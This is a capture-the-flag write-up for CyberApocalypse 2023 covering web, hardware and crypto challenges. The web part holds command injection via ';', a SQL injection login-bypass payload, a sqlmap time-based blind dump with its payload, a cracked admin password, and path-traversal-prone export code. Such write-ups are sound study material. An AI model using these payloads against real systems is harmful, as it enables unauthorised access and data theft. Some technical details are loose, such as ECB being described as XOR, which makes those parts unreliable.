---
title: "CTF - UTCTF 2023"
categories: [ctf]
date: 2023-03-13
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - CyberApocalypse 2023
---

# CyberApocalypse 2023

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/logo.jpg" width="65%"/>
</p>

Welcome to another CTF writeup. This time I played CyberApocalypse 2023, a wide variety of challenges and levels. We participate as [ISwearGoogledIt](https://ctftime.org/team/109689) with [RazviOverflow](https://razvioverflow.github.io/), [Bubu](https://albertofdr.github.io/) and [liti0s](https://ctftime.org/user/73060). Let's dive into the challenges!  

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/banner.png" width="85%"/>
</p>

---

Challenge index:

### Web

- [Trapped Source](#trapped-source)
- [Gunhead](#gunhead)
- [Drobots](#drobots)
- [Orbital](#orbital)


### Hardware

- [Timed Transmission](#timed-transmission)
- [Critical Flight](#critical-flight)
- [Debug](#debug)
- [Secret Code](#secret-code)


### Crypto

- [Perfect Synchronization](#perfect-synchronization)


### Misc

- [Hijack](#hijack)
- [nehebkaus trap](#nehebkaus-trap)


### Forensic

- [Plaintext Tleasure](#plaintext-tleasure)
- [Alien Cradle](#alien-cradle)
- [Extraterrestrial Persistence](#extraterrestrial-persistence)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>
<br>

--- 

<br>

# Web

## Trapped Source
Intergalactic Ministry of Spies tested Pandora's movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/8_0_web.png" width="85%"/>
</p>

Input the conde in teh source

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/8_1_flag.png" width="85%"/>
</p>

``` HTB{V13w_50urc3_c4n_b3_u53ful!!!} ```

<br>

## Gunhead

During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

We have the command /ping. We can do some command injection using ; at the end. Let's locate the flag with ls -la

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/9_0_inject.png" width="85%"/>
</p>

Now read with cat:

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/9_1_flag.png" width="85%"/>
</p>

``` HTB{4lw4y5_54n1t1z3_u53r_1nput!!!} ```

<br>

## Drobots

Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?

An easy SQL injection:

```sql
" or 1=1--
```

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/10_0_flag.png" width="85%"/>
</p>

``` HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!} ```

<br>

## Orbital

In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?


We have a login:

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/12_0_web.png" width="85%"/>
</p>

Checking the output from the login requests, we can see an error with inserting a double quote. Arranging other tests we did not findf any return data, so I thought that might be a time based attack. 

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/12_0_request.png" width="85%"/>
</p>

I used SQLMap to try those tests and eventually, we found that time based injection and started dumping the database:

```bash
sqlmap -r login --dbms=MySQL --technique=T --dump
...
(custom) POST parameter 'JSON username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
---
Parameter: JSON username ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"username":"admin" AND (SELECT 3656 FROM (SELECT(SLEEP(5)))YRCQ)-- lHPK","password":"admin"}
---

```

We can see a hash and using crackstating we get the password:

**md5(692b753c031f2905b89e7258dbc49bb) = ichliebedich**

And we can log in with the admin user:

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/12_2_flag.png" width="85%"/>
</p>

Now, checking the source code provided with the challenge, we can see in the _/export_ endpoint that no sanitization occurs in the _communicationName_ variable, which is controlled by the user. That's a LFI vulnerability:


```python
...
@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```

In the entrypoint.sh for stating the Docker container, we can see that the flag is on _signal_sleuth_firmware_ file:

```bash
# copy flag
COPY flag.txt /signal_sleuth_firmware
COPY files /communications/

# create database and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

So, making the request to export that file will get us the flag:

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/12_2_flag.png" width="85%"/>
</p>


``` HTB{T1m3_b4$3d_$ql1_4r3_fun!!!} ```

<br>

--- 

<br>


# Hardware

## Timed Transmission

As part of your initialization sequence, your team loaded various tools into your system, but you still need to learn how to use them effectively. They have tasked you with the challenge of finding the appropriate tool to open a file containing strange serial signals. Can you rise to the challenge and find the right tool?


We have a .sal file (Saleae), so let's go for Logic2. In case you don't know, it is a logic analyzer (a device with wires that you can attach to traces or components to see whats going on in that trace).

When you open it you can see the flag, a combination of the different signals (gotta think outside the box, it took me some time).

<p align="center">
  <img src="/images/writeups/CyberApocalypse2023/5_0_kek.png" width="85%"/>
</p>

Adjust the screen and get the flag:

``` HTB{b391N_tH3_HArdWAr3_QU3St} ```

<br>

## Critical Flight
Your team has assigned you to a mission to investigate the production files of Printed Circuit Boards for irregularities. This is in response to the deployment of nonfunctional DIY drones that keep falling out of the sky. The team had used a slightly modified version of an open-source flight controller in order to save time, but it appears that someone had sabotaged the design before production. Can you help identify any suspicious alterations made to the boards?

We have a PCB (you can spot it since those are the different layers of a Gerber file). Loading it in an online tool, we can start to see part of the flag, so the rest might be hidden in different layers:

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/2_0_flag.png" width="50%"/>
</p>

Removing different layers from the visualizaton we can see the flag. Concatenate it to get it correctly

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/2_1_ez_flag.png" width="50%"/>
</p>

``` HTB{533_7h3_1nn32_w02k1n95_0f_313c720n1c5#$@} ```

<br>

## Debug

Your team has recovered a satellite dish that was used for transmitting the location of the relic, but it seems to be malfunctioning. There seems to be some interference affecting its connection to the satellite system, but there are no indications of what it could be. Perhaps the debugging interface could provide some insight, but they are unable to decode the serial signal captured during the device's booting sequence. Can you help to decode the signal and find the source of the interference?

Using Logic2, we open the file:

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/3_0_async.png" width="80%"/>
</p>

We have two lines, TX (transmit) and RX (receive), so probably we have an Async Serial communication. To get this data, first we have to identify the baud rate this is using. We can do it by checking the elapsed time between the narrowest peaks in the signal, in this case, 8.68us. To calculate the baudrate, we will assume that 1 bit is being transmitted every 8.68us, so with some calculations we get the baudrate:


```
1 bit   1000000us
----- x --------- = 115.207,3732 bits/second
8.68us       1s
```

Now with the list of standard baud rates, we found that the nearest baud rate to the obtained baud rate is 115.200, so we will take it as a valid result, and configure the analyzer with this standard value:

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/3_1_baud.png" width="80%"/>
</p>

We can see the data in the table, let's export it to format it correctly and get a better understanding:


<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/3_1_export.png" width="80%"/>
</p>

With the following commands, we can get the complete text easily:

```bash
awk '{print $6}' < flag | sed ':a; N; $!ba; s/\n//g'
INFO:AUTOSTARTUPMODE=1\nNOTICE:BootingTrustedFirmware\nNOTICE:BL1:v1.3(release):f26889a\nNOTICE:BL1:Built:13:04:48,Jul302018\nINFO:BL1:RAM0x30200000-0x30209000\nINFO:Usingcryptolibrary'STMATFMiniCertificatesCryptoLibrary'\nINFO:BL1:SearchingFIPimage\nINFO:search_fipstart,slot:0\nINFO:search_fipend,slot:0,result:0\nINFO:VALIDcodeatslot0ref_ctr0x5555(21845)\nINFO:search_fipstart,slot:1\nINFO:search_fipend,slot:1,result:0\nINFO:VALIDcodeatslot1ref_ctr0x5555(21845)\nINFO:search_fipstart,slot:2\nINFO:search_fipend,slot:2,result:0\nINFO:VALIDcodeatslot2ref_ctr0x5555(21845)\nINFO:search_fipstart,slot:3\nINFO:search_fipend,slot:3,result:0\nINFO:VALIDcodeatslot3ref_ctr0x5555(21845)\nINFO:search_fipstart,slot:4\nINFO:search_fipend,slot:4,result:0\nINFO:TERMcodeatslot4\nINFO:Chosenslot=3\nINFO:BL1:Gettheimagedescriptor\nINFO:BL1:LoadingBL2\nINFO:Loadingimageid=6ataddress0x30209000\nINFO:Skipreservingregion[base=0x30209000,size=0x90]\nINFO:Imageid=6loadedataddress0x30209000,size=0x90\nINFO:cert_nv_ctr:1\nINFO:plat_nv_ctr:0\nINFO:Loadingimageid=1ataddress0x30209000\nINFO:Imageid=1loadedataddress0x30209000,size=0xf178\nNOTICE:BL1:BootingBL2\nINFO:Entrypointaddress=0x30209000\nNOTICE:BL20:v1.3(debug):25afa823\nNOTICE:BL20:Built:16:55:25,Jul172020\nNOTICE:EMMCbootcounteris47\nNOTICE:BL2:v1.3(debug):4ac84b3\nNOTICE:BL2:Built:15:39:21,Oct152020\nNOTICE:Evaluate0x8110010&0x10==0x0->0\nNOTICE:Usingdefaulttargetpackconfig\nBootfirmwarev20190415-1starting\n!*:#)$<@[|{!!("!%5!#!!"O-#A!!!"\nBootfirmwareexitingnormally\nNOTICE:BL2:endTP\nNNOTICE:BL31:v1.3(debug):4ac84b3\nNOTICE:BL31:Built:15:39:24,Oct152020\n\n\nU-Boot2016.05-00307-g16c388c(Jul232021-22:19:05+0000)\n\nDRAM:1004MiB\nMMC:Fastboot:eMMC:8xbit-div2\nstm-sdhci0:0\nUsingdefaultenvironment\n\nIn:nulldev\nOut:serial\nErr:serial\nCPUID:0x000201010x090110100xb9258380\nDetectedBoardrev:#rev1_pre_production\nsdhci_transfer_data:Errordetectedinstatus(0x208000)!\nsdhci_transfer_data:Errordetectedinstatus(0x208000)!\nFIP1:3FIP2:3\nBOOTSLOTB\nNet:NetInitializationSkipped\nNoethernetfound.\n\n\n}--O--{\n[^]\n/ooo\\n______________:/oo\:______________\n|=|=|=|=|=|=|:A|":|||:"|A:|=|=|=|=|=|=|\n^""""""""""""""!::{o}::!""""""""""""""^\n\/\n\.../\n____"---"____\n|\/\/|=======|*|=======|\/\/|\n:----"/-\"----:\n/ooo\\n#|ooo|#\n\___/\n\nIsproductionhardware?YES\n=============================================================================\n=Type'egypt'tostopbootprocessinthenext2seconds=\n=============================================================================\n\nsdhci_transfer_data:Errordetectedinstatus(0x208000)!\nsdhci_transfer_data:Errordetectedinstatus(0x208000)!\nswitchtopartitions#0,OK\nmmc0(part0)iscurrentdevice\n\nMMCread:dev#0,block#98304,count49152...49152blocksread:OK\n##LoadingkernelfromFITImageata2000000...\nUsing'rev1_pre_production@1'configuration\nVerifyingHashIntegrity...sha256,rsa2048:dev+OK\nTrying'kernel@1'kernelsubimage\nDescription:compressedkernel\nCreated:2020-10-1515:44:52UTC\nType:KernelImage\nCompression:lzmacompressed\nDataStart:0xa20000dc\nDataSize:2620262Bytes=2.5MiB\nArchitecture:AArch64\nOS:Linux\nLoadAddress:0x80080000\nLoadSize:unavailable\nEntryPoint:0x80080000\nHashalgo:sha256\nHashvalue:2eee092ccbd0a45f7d73aa1086d28994a60a615b7e967f0508e956a776bfe2b0\nVerifyingHashIntegrity...sha256+OK\n##LoadingramdiskfromFITImageata2000000...\nUsing'rev1_pre_production@1'configuration\nTrying'ramdisk@1'ramdisksubimage\nDescription:compressedramdisk\nCreated:2020-10-1515:40:21UTC\nType:RAMDiskImage\nCompression:lzmacompressed\nDataStart:0xa23139d4\nDataSize:5474268Bytes=5.2MiB\nArchitecture:AArch64\nOS:Linux\nLoadAddress:0xb0000000\nLoadSize:unavailable\nEntryPoint:0xb0000000\nHashalgo:sha256\nHashvalue:1bece01a0ad3c63006f24f6a07cad6f3ff023469907c202c8fc07eb5fda057b2\nVerifyingHashIntegrity...sha256+OK\nLoadingramdiskfrom0xa23139d4to0xb0000000\n##LoadingfdtfromFITImageata2000000...\nUsing'rev1_pre_production@1'configuration\nTrying'rev1_pre_production_fdt@1'fdtsubimage\nDescription:rev1preproductiondevicetree\nCreated:2020-10-1515:40:21UTC\nType:FlatDeviceTree\nCompression:uncompressed\nDataStart:0xa22d8650\nDataSize:60328Bytes=58.9KiB\nArchitecture:AArch64\nHashalgo:sha256\nHashvalue:b30932fd6e42020720ae6a062da9df0a5b5049f26b1bd8ddafd90cb9759a2922\nVerifyingHashIntegrity...sha256+OK\nLoadingfdtfrom0xa22d8650to0x8f000000\nBootingusingthefdtblobat0x8f000000\nUncompressingKernelImage...OK\nLoadingRamdiskto8fac7000,end8ffff7dc...OK\nLoadingDeviceTreeto000000008fab5000,end000000008fac6ba7...OK\nWARNING:ethactisnotset.Notincludingethprimein/chosen.\n\n======================================\n=GalaxyGatewayNetworkInformation=\n======================================\n\nWARNING:ThedeepspaceobservatoryisofflineHTB{\nINFO:Communicationsystemsareofflinereferencecode:547311173_\nWARNING:Unauthorizedsubroutinesdetected!referencecode:n37w02k_\nWARNING:Thesatellitedishcannotsyncwiththeswarm.referencecode:c0mp20m153d}\n\n______\n,'""-._\n,'"-.__._\n;__,-'/|\n;|,-'_,'"'._,.\n|:_,'|\`.\n:\_,-'|\`.\n\\,-'|\\\n\'..-.|\\n\\"|:\n`.`.||\n`."-._|;\n/|`._`-._L/\n/|\`._"-.____,'\n/|\_.-"-.___""""\n\:/"""\n`._\___.'_\n__,--''_'"--''''\_`-._\n__,--'.'/_|__.`-._`-._\n<`.`-.-''__,-'_,-'\n`.`._,-'"_,-'\n`.''"_,-'\n`._,-'\n`._,-'\n`.__,'"\n`'"\n\nStartingkernel...\n\nDevelopmentloginenabled:no\nDebuggingmodeenabled:yes\nSafemodeenabled:no\n\nSATDish-ManagmentUserTerminal.\nDishisoffline\nadminlogin:\n
```

In that transmission, we can see at the end the flag on the reference codes of the _WARNING:Thesatellitedishcannotsyncwiththeswarm_ meesage. WE get the flag by concatenating those Warnings:

``` HTB{547311173_n37w02k_c0mp20m153d} ```

<br>

## Secret Code

To gain access to the tomb containing the relic, you must find a way to open the door. While scanning the surrounding area for any unusual signals, you come across a device that appears to be a fusion of various alien technologies. However, the device is broken into two pieces and you are unable to see the secret code displayed on it. The device is transmitting a new character every second and you must decipher the transmitted signals in order to retrieve the code and gain entry to the tomb.


In the following pictures, we can see a PCB with the different channels and what it looks like a 7 segments display. The channels go to the different pads following this schema (yes, follow the traces)

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/4_0_pcb.png" width="80%"/>
</p>

```
Channel 0 - d
Channel 1 - dp
Channel 2 - a
Channel 3 - g
Channel 4 - c
Channel 5 - b
Channel 6 - e
Channel 7 - f
Channel -
Channel -
```

Now on Logic2 we have the following signals:

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/4_1_logic.png" width="80%"/>
</p>

So the target will be to display the codes it was being displayed on the 7 segments display. I was having fun, so I decided to get hands on and get my Raspberry Pi involved in this challenge. The main goal is to export somehow the different channels, create an array for each character and display it on a physical display with the RaspPi.

First, export the data. Hit the menu button in the bottom right and select export raw, then select CVS:

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/4_2_export.png" width="80%"/>
</p>

We will end up with the following file:

```
Time [s],Channel 0,Channel 1,Channel 2,Channel 3,Channel 4,Channel 5,Channel 6,Channel 7
0.000000000,0,0,0,0,0,0,0,0
0.695667880,0,0,0,1,0,0,0,0
0.695672280,0,0,0,1,0,0,0,1
0.695680200,0,0,0,1,0,1,0,1
0.695691400,0,0,0,1,1,1,0,1
0.695695040,0,1,0,1,1,1,0,1
1.696727760,0,0,0,1,1,1,0,1
1.897122440,0,0,1,1,1,1,0,1
1.897129960,0,0,1,1,1,1,1,1
1.897133720,1,0,1,1,1,1,1,1
1.897141520,1,1,1,1,1,1,1,1
2.898179000,1,0,1,1,1,1,1,1
3.098577240,1,0,1,1,1,0,1,1
3.098580720,1,0,1,1,1,0,0,1
3.098592280,1,1,1,1,1,0,0,1
4.099633160,1,0,1,1,1,0,0,1
4.300025440,1,0,0,1,1,0,0,1
4.300029040,1,0,0,1,1,1,0,1
4.300036040,0,0,0,1,1,1,0,1
...
```

Seems like it will export any modification on any channel, so we will have to process this, since the character is displayed every 1.2 seconds. I created the following script to export each character:

```python
import csv
import json

message = {'t': [],'a': [],'b': [],'c': [],'d': [],'e': [],'f': [],'g': [],'dp': [],'k':[]}
t, a, b, c, d, e, f, g, dp = 0,0,0,0,0,0,0,0,0

with open('digital.csv') as csv_file:

    csv_reader = csv.reader(csv_file, delimiter=',')
    prev_time, current_time = 0, 0

    state = 0

    # For every line of the raw data
    for row in csv_reader:

        # Set an initial state for the algoritm
        if prev_time == 0 and current_time == 0:
            prev_time = float(row[0])

        # Current time for line of the data
        current_time = float(row[0])

        # If the dot is turning ON, new char is coming, so get until the last 
        # (last is less than 0.2s away of this state, but I gave a wide margin)
        if not state and int(row[2]):
            state = 1 # Change the state to 1 since the dot is ON now
            if abs(prev_time - current_time) < 0.8 and int(row[2]):
                t = int(row[0])
                a = int(row[3])
                b = int(row[6])
                c = int(row[5])
                d = int(row[1])
                e = int(row[7])
                f = int(row[8])
                g = int(row[4])
                dp = int(row[2])

        # Dot is switching OFF, store last array
        if state and not int(row[2]):
            state = 0
            message['t'].append(t)
            message['k'].append((d,dp,a,g,c,b,e,f))
        
        # Update the time   
        prev_time = current_time

# Export the arrays
with open('output.json', 'w') as out_file:
    json.dump(message, out_file, indent=4)
```

The output is something like this:

```json
{
    "t": [0.69569504, 1.89714152, 3.09859228, 4.30004388,"..."], 
    "k": [
        [0, 1, 0, 1, 1, 1, 0, 1], 
        [1, 1, 1, 1, 1, 1, 1, 1], 
        [1, 1, 1, 1, 1, 0, 0, 1], 
        [0, 1, 0, 1, 1, 1, 0, 1], 
        "..."
    ]
}
```

Now that we have the info, I created the script that it is going to run in the Raspberry Pi 3B+. I 

```python
import RPi.GPIO as gpio
import json
import time

gpio.setmode(gpio.BCM)
gpio.setup(16, gpio.OUT)    # a
gpio.setup(12, gpio.OUT)    # b
gpio.setup(26, gpio.OUT)    # c
gpio.setup(13, gpio.OUT)    # d
gpio.setup(6, gpio.OUT)     # e
gpio.setup(5, gpio.OUT)     # f
gpio.setup(25, gpio.OUT)    # g
gpio.setup(24, gpio.OUT)    # dp

# Set GPIO numbers to access easily
leds = [16, 12, 26, 13, 6, 5, 25, 24]

# Get the previous output
with open('output.json', 'r') as in_file:
    data = json.load(in_file)

# Turn off all the segments
for i in range(0, 8):
    gpio.output(leds[i], gpio.LOW)

# For each line
for s in data['k']:

    # For each segment
    for i in range(0, 8):
        # Check if is ON or OFF and replicate it
        if int(s[i]):
            print(i, s[i])
            gpio.output(leds[i], gpio.HIGH)
        else:
            gpio.output(leds[i], gpio.LOW)
    # Let me take note of the state
    time.sleep(2)
    # And reset, to avoid confusion on repeated chars
    for i in range(0, 7):
        gpio.output(leds[i], gpio.LOW)
    time.sleep(0.5)
```

Do all the wiring. I used a common cathode 7 segments display wired with pull down resistors (important hehe). This is the POC:

<p align="center">
  <video src="/images/ctfs/CyberApocalypse2023/4_3_flag.png" width="80%"/>
</p>

Taking notes of the chars we get the following hexadecimals (B was displayed as b, D as d and F as F):

``` 4854427B70307733325F63306D33355F6632306D5F77313768316E4021237D ```

Using a basic hexadecimal to ASCII we get the flag:

``` HTB{p0w32_c0m35_f20m_w17h1n@!#} ```


<br>

--- 

<br>

# Crypto

## Perfect Synchronization

The final stage of your initialization sequence is mastering cutting-edge technology tools that can be life-changing. One of these tools is quipqiup, an automated tool for frequency analysis and breaking substitution ciphers. This is the ultimate challenge, simulating the use of AES encryption to protect a message. Can you break it?


We have the following source code:

```python
from os import urandom
from Crypto.Cipher import AES
from secret import MESSAGE
import json
import string

assert all([x.isupper() or x in '{_} ' for x in MESSAGE])

class Cipher:

    def __init__(self):
        self.salt = urandom(15)
        key = urandom(16)
        print(key, self.salt)
        self.cipher = AES.new(key, AES.MODE_ECB)

    def encrypt(self, message):
        return [self.cipher.encrypt(c.encode() + self.salt) for c in message]


def main():

    cipher = Cipher()
    encrypted = cipher.encrypt(MESSAGE)
    encrypted = "\n".join([c.hex() for c in encrypted])

    with open("output.txt", 'w+') as f:
        f.write(encrypted)

if __name__ == "__main__":
    main()

```

And the output from the script:

```
dfc8a2232dc2487a5455bda9fa2d45a1
305d4649e3cb097fb094f8f45abbf0dc
c87a7eb9283e59571ad0cb0c89a74379
60e8373bfb2124aea832f87809fca596
d178fac67ec4e9d2724fed6c7b50cd26
c87a7eb9283e59571ad0cb0c89a74379
34ece5ff054feccc5dabe9ae90438f9d
457165130940ceac01160ac0ff924d86
5d7185a6823ab4fc73f3ea33669a7bae
61331054d82aeec9a20416759766d9d5
...
Up to 1479 lines...
```

We have the AES encription in the script, which has almost no entropy and no dispersion due to the ECB (Electronic CodeBlock) operation mode. Basically, this is a XOR operation over all blocks, so we can do a frequecy analysis over the output, since it is not only the flag, but probably, a complete text:


<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/13_0_ecb.png" width="80%"/>
</p>

With the following script we can check which lines are repeated the most:

```python
    with open('output.txt', 'r') as in_file:
        data = in_file.read().splitlines()

    text = []
    d = {}

    # Go over all lines and count them
    for i in data:
        if i in d:
            d[i] += 1
        else:
            d[i] = 1

    # Sort the found lines by appearances
    d2 = {k: v for k, v in sorted(d.items(), key=lambda item: item[1], reverse=True)}

    print(json.dumps(d2, indent=True))
```

This is the output:

```json
{
 "61331054d82aeec9a20416759766d9d5": 230,
 "c87a7eb9283e59571ad0cb0c89a74379": 142,
 "200ecd2657df0197f202f258b45038d8": 104,
 "5f122076e17398b7e21d1762a61e2e0a": 103,
 "68d763bc4c7a9b0da3828e0b77b08b64": 100,
 "305d4649e3cb097fb094f8f45abbf0dc": 88,
 "e9b131ab270c54bbf67fb4bd9c8e3177": 87,
 "34ece5ff054feccc5dabe9ae90438f9d": 84,
 "8cbd4cfebc9ddf583a108de1a69df088": 75,
 "f89f2719fb2814d9ab821316dae9862f": 61,
 "457165130940ceac01160ac0ff924d86": 54,
 "3a17ebebf2bad9aa0dd75b37a58fe6ea": 45,
 "d178fac67ec4e9d2724fed6c7b50cd26": 41,
 "e23c1323abc1fc41331b9cdfc40d5856": 37,
 "5d7185a6823ab4fc73f3ea33669a7bae": 34,
 "dfc8a2232dc2487a5455bda9fa2d45a1": 31,
 "2190a721b2dcb17ff693aa5feecb3b58": 31,
 "78de2d97da222954cce639cc4b481050": 23,
 "9673dbe632859fa33b8a79d6a3e3fe30": 22,
 "4a3af0b7397584c4d450c6f7e83076aa": 22,
 "66975492b6a53cc9a4503c3a1295b6a7": 19,
 "fb78aed37621262392a4125183d1bfc9": 10,
 "0df9b4e759512f36aaa5c7fd4fb1fba8": 8,
 "293f56083c20759d275db846c8bfb03e": 8,
 "60e8373bfb2124aea832f87809fca596": 7,
 "2fc20e9a20605b988999e836301a2408": 5,
 "a94f49727cf771a85831bd03af1caaf5": 4,
 "5ae172c9ea46594cea34ad1a4b1c79cd": 2,
 "fbe86a428051747607a35b44b1a3e9e9": 1,
 "c53ba24fbbe9e3dbdd6062b3aab7ed1a": 1
}
```

Might me logical to think that the last two lines correspond to { and } since the flag is composed by them. We expect the message to be in english, therefore, we can appli a substitution from the [english character frequency](https://www3.nd.edu/~busiforc/handouts/cryptography/letterfrequencies.html).

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/13_1_letters.png" width="70%"/>
</p>

Now we can craft a list sorted by most frequent character and substitute each hexadecimal line with the corresponding word. I added the space in the first place since searching for its frequency in google provides the best: _The SPACE character (represented by ' ') has the largest probability, about 20%._


```python
lets = " ETAOINSRHDLUCMFYWGPBVKXQJ" + '_:{}'
new_d = {}

# Create a dict with hexadecimal as key and final letter as value 
for line, letter in zip(d2,lets):
    new_d[line] = letter

# Print the relationship between the hex and the letter
print(json.dumps(new_d, indent=True))
```

The substitution dictionary:

```json
{
 "61331054d82aeec9a20416759766d9d5": " ",
 "c87a7eb9283e59571ad0cb0c89a74379": "E",
 "200ecd2657df0197f202f258b45038d8": "T",
 "5f122076e17398b7e21d1762a61e2e0a": "A",
 "68d763bc4c7a9b0da3828e0b77b08b64": "O",
 "305d4649e3cb097fb094f8f45abbf0dc": "I",
 "e9b131ab270c54bbf67fb4bd9c8e3177": "N",
 "34ece5ff054feccc5dabe9ae90438f9d": "S",
 "8cbd4cfebc9ddf583a108de1a69df088": "R",
 "f89f2719fb2814d9ab821316dae9862f": "H",
 "457165130940ceac01160ac0ff924d86": "D",
 "3a17ebebf2bad9aa0dd75b37a58fe6ea": "L",
 "d178fac67ec4e9d2724fed6c7b50cd26": "U",
 "e23c1323abc1fc41331b9cdfc40d5856": "C",
 "5d7185a6823ab4fc73f3ea33669a7bae": "M",
 "dfc8a2232dc2487a5455bda9fa2d45a1": "F",
 "2190a721b2dcb17ff693aa5feecb3b58": "Y",
 "78de2d97da222954cce639cc4b481050": "W",
 "9673dbe632859fa33b8a79d6a3e3fe30": "G",
 "4a3af0b7397584c4d450c6f7e83076aa": "P",
 "66975492b6a53cc9a4503c3a1295b6a7": "B",
 "fb78aed37621262392a4125183d1bfc9": "V",
 "0df9b4e759512f36aaa5c7fd4fb1fba8": "K",
 "293f56083c20759d275db846c8bfb03e": "X",
 "60e8373bfb2124aea832f87809fca596": "Q",
 "2fc20e9a20605b988999e836301a2408": "J",
 "a94f49727cf771a85831bd03af1caaf5": "_",
 "5ae172c9ea46594cea34ad1a4b1c79cd": ":",
 "fbe86a428051747607a35b44b1a3e9e9": "{",
 "c53ba24fbbe9e3dbdd6062b3aab7ed1a": "}"
}
```

And the complete code to generate the message:


```python
from os import urandom
from Crypto.Cipher import AES
from secret import MESSAGE
import json
import string

assert all([x.isupper() or x in '{_} ' for x in MESSAGE])

class Cipher:

    def __init__(self):
        self.salt = urandom(15)
        key = urandom(16)
        print(key, self.salt)
        self.cipher = AES.new(key, AES.MODE_ECB)

    def encrypt(self, message):
        return [self.cipher.encrypt(c.encode() + self.salt) for c in message]


def main():
    cipher = Cipher()

    with open('output.txt', 'r') as in_file:
        data = in_file.read().splitlines()

    text = []
    d = {}

    # Go over all lines and count them
    for i in data:
        if i in d:
            d[i] += 1
        else:
            d[i] = 1

    # Sort the found lines by appearances
    d2 = {k: v for k, v in sorted(d.items(), key=lambda item: item[1], reverse=True)}

    # Check the frequencies
    print(json.dumps(d2, indent=True))

    lets = " ETAOINSRHDLUCMFYWGPBVKXQJ" + '_:{}'
    new_d = {}

    # Create a dict with hexadecimal as key and final letter as value 
    for line, letter in zip(d2,lets):
        new_d[line] = letter

    # Print the relationship between the hex and the letter
    print(json.dumps(new_d, indent=True))

    my_msg = []
    for i in data:
        my_msg.append(new_d[i])

    print(''.join(my_msg))
    

if __name__ == "__main__":
    main()
```

The output:

```
FIEQUESDM ASAHMTNT NT GATEC RS OLE FADO OLAO NS ASM WNKES TOIEODL RF BINOOES HASWUAWE 
DEIOANS HEOOEIT ASC DRPGNSAONRST RF HEOOEIT RDDUI BNOL KAIMNSW FIEQUESDNET PRIERKEI 
OLEIE NT A DLAIADOEINTOND CNTOINGUONRS RF HEOOEIT OLAO NT IRUWLHM OLE TAPE FRI AHPRTO 
AHH TAPYHET RF OLAO HASWUAWE NS DIMYOASAHMTNT FIEQUESDM ASAHMTNT AHTR VSRBS AT DRUSONSW 
HEOOEIT NT OLE TOUCM RF OLE FIEQUESDM RF HEOOEIT RI WIRUYT RF HEOOEIT NS A DNYLEIOEJO OLE 
PEOLRC NT UTEC AT AS ANC OR GIEAVNSW DHATTNDAH DNYLEIT FIEQUESDM ASAHMTNT IEQUNIET RSHM A 
GATND USCEITOASCNSW RF OLE TOAONTONDT RF OLE YHANSOEJO HASWUAWE ASC TRPE YIRGHEP TRHKNSW 
TVNHHT ASC NF YEIFRIPEC GM LASC ORHEIASDE FRI EJOESTNKE HEOOEI GRRVVEEYNSW CUINSW BRIHC BAI 
NN GROL OLE GINONTL ASC OLE APEINDAST IEDIUNOEC DRCEGIEAVEIT GM YHADNSW DIRTTBRIC YUXXHET 
NS PA:RI SEBTYAYEIT ASC IUSSNSW DRSOETOT FRI BLR DRUHC TRHKE OLEP OLE FATOETO TEKEIAH RF 
OLE DNYLEIT UTEC GM OLE AJNT YRBEIT BEIE GIEAVAGHE UTNSW FIEQUESDM ASAHMTNT FRI EJAPYHE 
TRPE RF OLE DRSTUHAI DNYLEIT UTEC GM OLE :AYASETE PEDLASNDAH PEOLRCT RF HEOOEI DRUSONSW 
ASC TOAONTONDAH ASAHMTNT WESEIAHHM LOG{A_TNPYHE_TUGTONOUONRS_NT_BEAV} DAIC OMYE PADLNSEIM 
BEIE FNITO UTEC NS BRIHC BAI NN YRTTNGHM GM OLE UT AIPMT TNT ORCAM OLE LAIC BRIV RF 
HEOOEI DRUSONSW ASC ASAHMTNT LAT GEES IEYHADEC GM DRPYUOEI TRFOBAIE BLNDL DAS DAIIM 
RUO TUDL ASAHMTNT NS TEDRSCT BNOL PRCEIS DRPYUONSW YRBEI DHATTNDAH DNYLEIT AIE USHNVEHM 
OR YIRKNCE ASM IEAH YIROEDONRS FRI DRSFNCESONAH CAOA YUXXHE YUXXHE YUXXHE
```

